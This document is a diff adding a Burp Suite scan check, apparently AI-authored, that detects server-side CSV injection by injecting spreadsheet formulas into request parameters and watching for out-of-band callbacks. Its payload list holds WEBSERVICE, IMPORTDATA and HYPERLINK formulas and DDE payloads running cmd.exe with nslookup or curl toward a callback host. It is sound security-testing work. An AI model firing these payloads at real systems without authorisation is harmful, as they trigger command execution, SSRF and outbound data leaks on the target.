@@ -1,0 +1,352 @@
+id: c7d2f8a4-3e1b-4f9c-b6a2-5e8d0c4f7b1e
+name: Server-Side CSV Injection — OOB Interaction Detector
+function: SCAN_CHECK_ACTIVE_PER_INSERTION_POINT
+location: SCANNER
+source: |
+  /**
+   * Server-Side CSV Injection (SSCI) — Out-of-Band Interaction Detector
+   *
+   * Injects spreadsheet formula payloads into every parameter/body/cookie
+   * insertion point and confirms exploitation via out-of-band DNS or HTTP
+   * callbacks. Covers Google Sheets, LibreOffice Calc, and Excel DDE vectors.
+   *
+   * OOB MODES (resolved at runtime):
+   *
+   *   1. Custom domain (preferred)
+   *      Set the Java system property "csv.oob.domain" to a domain you control
+   *      and have a wildcard DNS/HTTP listener on, e.g.:
+   *        - Via Burp Globals extension:  key=csv.oob.domain  value=c2.example.com
+   *        - Via JVM arg:                 -Dcsv.oob.domain=c2.example.com
+   *      A unique 12-char token is prepended per payload: <token>.c2.example.com
+   *      Correlation tokens are logged to the Burp output console and embedded
+   *      in the issue detail. Findings are reported TENTATIVE — verify callbacks
+   *      on your listener and upgrade manually.
+   *
+   *   2. Burp Collaborator (automatic fallback)
+   *      When "csv.oob.domain" is not set, the script uses Burp Collaborator.
+   *      IMPORTANT: enable the "Use Collaborator" toggle in the Bambda script
+   *      settings panel so that `collaboratorClient` is in scope.
+   *      Interactions are polled automatically; confirmed findings are reported
+   *      as HIGH / CERTAIN (HTTP callback) or HIGH / FIRM (DNS-only callback).
+   *
+   * PAYLOADS (5 variants, one Collaborator domain per payload):
+   *   - Google Sheets / LibreOffice WEBSERVICE  — OOB HTTP
+   *   - Google Sheets IMPORTDATA                — OOB HTTP
+   *   - HYPERLINK formula (multi-engine)        — OOB HTTP (auto-fetch in some engines)
+   *   - Excel / LibreOffice DDE via nslookup    — OOB DNS
+   *   - Excel / LibreOffice DDE via curl        — OOB HTTP (Linux/macOS server)
+   *
+   * @author burp-bambdas skill
+   **/
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // GUARD: skip null insertion points
+  // ═══════════════════════════════════════════════════════════════════════════
+  if (insertionPoint == null) {
+      return AuditResult.auditResult();
+  }
+
+  // Skip insertion points that are very unlikely to flow into CSV exports.
+  // HTTP headers and URL path segments are rarely stored and re-exported as
+  // spreadsheet data; testing them would generate noise with near-zero signal.
+  var ipType = insertionPoint.type();
+  if (ipType == AuditInsertionPointType.HEADER
+          || ipType == AuditInsertionPointType.URL_PATH_FILENAME
+          || ipType == AuditInsertionPointType.URL_PATH_FOLDER) {
+      return AuditResult.auditResult();
+  }
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // CONFIG
+  // ═══════════════════════════════════════════════════════════════════════════
+  final long    POLL_SLEEP_MS = 1_000;   // ms between Collaborator poll attempts
+  final long    TOTAL_TIME_MS = 10_000;  // max total poll time — keep short: runs per insertion point!
+  final boolean DEBUG         = false;   // set true to log payload detail to Burp output
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // PAYLOAD CATALOGUE
+  // ═══════════════════════════════════════════════════════════════════════════
+  // Each template contains $OOB_HOST, replaced at send time with a unique
+  // hostname (token.baseDomain or Collaborator domain).
+
+  record PayloadSpec(String engine, String description, String template) {}
+
+  var specs = java.util.List.of(
+      new PayloadSpec(
+          "Google Sheets / LibreOffice WEBSERVICE",
+          "WEBSERVICE() triggers an outbound HTTP GET when the formula is evaluated server-side",
+          "=WEBSERVICE(\"http://$OOB_HOST/\")"
+      ),
+      new PayloadSpec(
+          "Google Sheets IMPORTDATA",
+          "IMPORTDATA() fetches a remote URL and imports its content — OOB HTTP on server-side evaluation",
+          "=IMPORTDATA(\"http://$OOB_HOST/\")"
+      ),
+      new PayloadSpec(
+          "HYPERLINK formula (multi-engine)",
+          "HYPERLINK() embeds a URL; some server-side spreadsheet processors auto-fetch on formula eval",
+          "=HYPERLINK(\"http://$OOB_HOST/\",\"click\")"
+      ),
+      new PayloadSpec(
+          "Excel / LibreOffice DDE — nslookup DNS",
+          "DDE payload invokes cmd.exe to run nslookup, triggering an OOB DNS lookup",
+          "=cmd|' /C nslookup $OOB_HOST'!A0"
+      ),
+      new PayloadSpec(
+          "Excel / LibreOffice DDE — curl HTTP",
+          "DDE payload invokes cmd.exe / sh to run curl, triggering an OOB HTTP callback (Linux/macOS servers)",
+          "=cmd|' /C curl http://$OOB_HOST/'!A0"
+      )
+  );
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // SHARED: used when building Collaborator-mode SentEntry records
+  // ═══════════════════════════════════════════════════════════════════════════
+  record SentEntry(HttpRequestResponse rr, PayloadSpec spec) {}
+
+  var issues = new java.util.ArrayList<AuditIssue>();
+
+  // ═══════════════════════════════════════════════════════════════════════════
+  // OOB MODE RESOLUTION
+  // ═══════════════════════════════════════════════════════════════════════════
+  var customBaseDomain = System.getProperty("csv.oob.domain");
+  var useCustomDomain  = (customBaseDomain != null && !customBaseDomain.isBlank());
+
+  if (useCustomDomain) {
+
+      // ───────────────────────────────────────────────────────────────────────
+      // CUSTOM DOMAIN MODE
+      // Fire all payloads with unique per-payload tokens embedded in the
+      // subdomain. The tester monitors their listener and correlates via token.
+      // Programmatic verification is not possible without an API to the
+      // listener, so findings are reported TENTATIVE.
+      // ───────────────────────────────────────────────────────────────────────
+      var base      = customBaseDomain.trim();
+      var tokens    = new java.util.ArrayList<String>();
+      var sentRR    = new java.util.LinkedHashMap<String, HttpRequestResponse>();
+
+      for (var spec : specs) {
+          // Random 12-char lowercase alphanumeric token — unique per payload
+          var token   = api().utilities().randomUtils().randomString(12).toLowerCase();
+          var oobHost = token + "." + base;
+          var payload = spec.template().replace("$OOB_HOST", oobHost);
+
+          var rr = http.sendRequest(
+              insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(payload))
+          );
+          tokens.add(token);
+          sentRR.put(token, rr);
+
+          if (DEBUG) {
+              api().logging().logToOutput(
+                  "[SSCI:custom] engine=" + spec.engine()
+                      + "  token=" + token
+                      + "  param=" + insertionPoint.name()
+                      + "  url=" + rr.request().url()
+              );
+          }
+      }
+
+      // Log correlation table to Burp output so the tester can match
+      // incoming callbacks to the exact parameter and payload engine.
+      var logSb = new StringBuilder();
+      logSb.append("[SSCI] Fired ").append(specs.size())
+           .append(" payloads  param=").append(insertionPoint.name())
+           .append("  target=").append(requestResponse.request().url()).append("\n");
+      for (int i = 0; i < specs.size(); i++) {
+          logSb.append("  [").append(i + 1).append("] ")
+               .append(specs.get(i).engine())
+               .append("  →  watch: ").append(tokens.get(i)).append(".").append(base)
+               .append("\n");
+      }
+      api().logging().logToOutput(logSb.toString());
+
+      // Build issue detail with correlation token list.
+      var detail = new StringBuilder();
+      detail.append("<p>Injected <strong>").append(specs.size())
+            .append("</strong> CSV formula payloads into parameter <code>")
+            .append(api().utilities().htmlUtils().encode(insertionPoint.name()))
+            .append("</code>.</p>")
+            .append("<p>Monitor your DNS/HTTP listener at <strong><code>*.")
+            .append(api().utilities().htmlUtils().encode(base))
+            .append("</code></strong> for callbacks. Each payload uses a unique subdomain prefix ")
+            .append("(correlation token) listed below — a callback on <em>token</em>.<em>basedomain</em> ")
+            .append("confirms exploitation for that specific engine and insertion point.</p><ul>");
+      for (int i = 0; i < specs.size(); i++) {
+          detail.append("<li><strong>")
+                .append(api().utilities().htmlUtils().encode(specs.get(i).engine()))
+                .append("</strong> — token: <code>")
+                .append(api().utilities().htmlUtils().encode(tokens.get(i)))
+                .append("</code> (watch <code>")
+                .append(api().utilities().htmlUtils().encode(tokens.get(i) + "." + base))
+                .append("</code>)</li>");
+      }
+      detail.append("</ul>");
+      detail.append("<p><em>Confidence is TENTATIVE until an OOB callback is observed. ")
+            .append("Upgrade this issue to HIGH / CERTAIN once a callback is confirmed.</em></p>");
+
+      var evidenceRr = sentRR.values().iterator().next();
+
+      issues.add(AuditIssue.auditIssue(
+          "Server-Side CSV Injection — OOB payloads fired, verify manually ["
+              + api().utilities().htmlUtils().encode(insertionPoint.name()) + "]",
+          detail.toString(),
+          "<p>Sanitise all user-controlled data before embedding in CSV or spreadsheet exports. "
+              + "Strip or single-quote-prefix characters that trigger spreadsheet formula evaluation: "
+              + "<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>|</code>, "
+              + "TAB (<code>%09</code>), CR (<code>%0d</code>). "
+              + "Apply <code>Content-Disposition: attachment; filename=export.csv</code> to all "
+              + "CSV download responses. Enforce egress firewall rules on the processing server.</p>",
+          requestResponse.request().url(),
+          AuditIssueSeverity.MEDIUM,
+          AuditIssueConfidence.TENTATIVE,
+          "<p><strong>Server-Side CSV Injection (SSCI)</strong> occurs when user-controlled input is "
+              + "embedded in a CSV or spreadsheet file that is subsequently processed server-side by a "
+              + "library capable of evaluating spreadsheet formulas — for example Apache POI with formula "
+              + "evaluation enabled, Google Sheets API import, LibreOffice Calc running headless, or "
+              + "any ETL pipeline that opens and recalculates workbooks. "
+              + "When the injected formula is evaluated, it may trigger outbound DNS or HTTP interactions "
+              + "that can be used for SSRF, data exfiltration, or as a pivot to further exploitation.</p>",
+          "<p>Apply input sanitisation at the point where user data is written into the spreadsheet cell. "
+              + "Prepend a single-quote (<code>'</code>) to any cell value that begins with a formula "
+              + "trigger character. Use a purpose-built CSV/XLSX sanitisation library where available. "
+              + "If the server-side library does not require formula evaluation, disable it explicitly "
+              + "in the API configuration. Enforce network egress controls so the processing host cannot "
+              + "initiate outbound DNS or HTTP to arbitrary destinations.</p>",
+          AuditIssueSeverity.HIGH,
+          evidenceRr
+      ));
+
+  } else {
+
+      // ───────────────────────────────────────────────────────────────────────
+      // COLLABORATOR MODE (automatic OOB verification)
+      // Generate a fresh Collaborator payload per formula variant; map each
+      // payload ID to its sent HttpRequestResponse so interactions can be
+      // linked to the correct evidence when polling.
+      // ───────────────────────────────────────────────────────────────────────
+      var sent = new java.util.HashMap<String, SentEntry>();
+
+      for (var spec : specs) {
+          var collabPayload = collaboratorClient.generatePayload();
+          var oobHost       = collabPayload.toString();          // e.g. abc123.oastify.com
+          var payload       = spec.template().replace("$OOB_HOST", oobHost);
+
+          var rr = http.sendRequest(
+              insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(payload))
+          );
+          // Key on id (unique label part), not the full domain.
+          sent.put(collabPayload.id().toString(), new SentEntry(rr, spec));
+
+          if (DEBUG) {
+              api().logging().logToOutput(
+                  "[SSCI:collab] engine=" + spec.engine()
+                      + "  id=" + collabPayload.id().toString()
+                      + "  param=" + insertionPoint.name()
+              );
+          }
+      }
+
+      // Bounded poll loop — interactions may arrive slightly after the HTTP
+      // round-trip completes (especially DNS which propagates async).
+      try {
+          long start = System.currentTimeMillis();
+          while (System.currentTimeMillis() - start < TOTAL_TIME_MS) {
+
+              var interactions = collaboratorClient.getAllInteractions();
+              for (var interaction : interactions) {
+                  var entry = sent.get(interaction.id().toString());
+                  if (entry == null) continue;   // not one of our payloads
+
+                  var itype    = interaction.type().toString();
+                  var clientIp = api().utilities().htmlUtils().encode(
+                      interaction.clientIp().getHostAddress()
+                  );
+
+                  // Build rich issue detail with interaction metadata.
+                  var detail = new StringBuilder();
+                  detail.append("<p>Burp Collaborator confirmed a <strong>")
+                        .append(api().utilities().htmlUtils().encode(itype))
+                        .append("</strong> interaction originating from <code>")
+                        .append(clientIp)
+                        .append("</code> after injecting a <em>")
+                        .append(api().utilities().htmlUtils().encode(entry.spec().engine()))
+                        .append("</em> CSV formula payload into parameter <code>")
+                        .append(api().utilities().htmlUtils().encode(insertionPoint.name()))
+                        .append("</code>.</p>");
+                  detail.append("<p><strong>Payload type:</strong> <em>")
+                        .append(api().utilities().htmlUtils().encode(entry.spec().description()))
+                        .append("</em></p>");
+                  detail.append("<p><strong>Interaction received:</strong> <code>")
+                        .append(interaction.timeStamp())
+                        .append("</code></p>");
+
+                  // Annotate with protocol-specific details for the report.
+                  if (interaction.httpDetails().isPresent()) {
+                      var httpInt = interaction.httpDetails().get();
+                      detail.append("<p>HTTP callback captured over <code>")
+                            .append(api().utilities().htmlUtils()
+                                .encode(httpInt.protocol().toString()))
+                            .append("</code>. This confirms the server evaluated the injected formula "
+                                + "and initiated an outbound HTTP request — consistent with server-side "
+                                + "spreadsheet formula execution (SSCI / SSRF via formula).</p>");
+                  } else if (interaction.dnsDetails().isPresent()) {
+                      var dnsInt = interaction.dnsDetails().get();
+                      detail.append("<p>DNS <code>")
+                            .append(api().utilities().htmlUtils()
+                                .encode(dnsInt.queryType().toString()))
+                            .append("</code> query received. DNS-only interactions confirm the payload "
+                                + "was parsed and a name resolution attempted — this may indicate formula "
+                                + "evaluation or DDE trigger. Escalate with an HTTP-carrying payload to "
+                                + "confirm full SSRF capability.</p>");
+                  }
+
+                  // HTTP callback = CERTAIN (full round-trip confirmed);
+                  // DNS-only = FIRM (name resolved, full HTTP not yet confirmed).
+                  var confidence = interaction.httpDetails().isPresent()
+                      ? AuditIssueConfidence.CERTAIN
+                      : AuditIssueConfidence.FIRM;
+
+                  issues.add(AuditIssue.auditIssue(
+                      "Server-Side CSV Injection — confirmed OOB " + itype + " interaction ["
+                          + api().utilities().htmlUtils().encode(insertionPoint.name()) + "]",
+                      detail.toString(),
+                      "<p>Sanitise all user-controlled data before embedding in CSV or spreadsheet exports. "
+                          + "Strip or single-quote-prefix characters that trigger formula evaluation: "
+                          + "<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>|</code>. "
+                          + "Apply <code>Content-Disposition: attachment; filename=export.csv</code> to all "
+                          + "CSV download responses. Enforce egress firewall rules so the processing server "
+                          + "cannot initiate outbound DNS or HTTP to arbitrary destinations.</p>",
+                      requestResponse.request().url(),
+                      AuditIssueSeverity.HIGH,
+                      confidence,
+                      "<p><strong>Server-Side CSV Injection (SSCI)</strong> occurs when user-controlled input "
+                          + "is embedded in a spreadsheet or CSV file processed server-side by a library "
+                          + "that evaluates formulas — e.g. Apache POI with formula evaluation, LibreOffice "
+                          + "Calc headless, Google Sheets API import, or any ETL pipeline that opens and "
+                          + "recalculates workbooks. A confirmed OOB interaction means the injected formula "
+                          + "was evaluated and the server initiated an outbound network request. Depending "
+                          + "on the server environment this can be escalated to blind SSRF, internal network "
+                          + "reconnaissance, data exfiltration via DNS/HTTP, or full RCE via DDE.</p>",
+                      "<p>Sanitise at the data-write layer: prepend <code>'</code> to any cell value "
+                          + "starting with a formula trigger character. Use a purpose-built sanitisation "
+                          + "library (e.g. OWASP CSV Injection prevention). Disable formula evaluation in "
+                          + "the spreadsheet-processing API where not required. Enforce network egress "
+                          + "controls on the processing host. Apply <code>Content-Disposition: attachment</code> "
+                          + "to prevent formula execution in the user's browser.</p>",
+                      AuditIssueSeverity.HIGH,
+                      entry.rr()
+                  ));
+              }
+
+              if (!issues.isEmpty()) break;   // stop polling on first confirmed hit
+              java.util.concurrent.TimeUnit.MILLISECONDS.sleep(POLL_SLEEP_MS);
+          }
+      } catch (InterruptedException ignored) {
+          Thread.currentThread().interrupt();
+      }
+  }
+
+  return issues.isEmpty()
+      ? AuditResult.auditResult()
+      : AuditResult.auditResult(issues.toArray(new AuditIssue[0]));
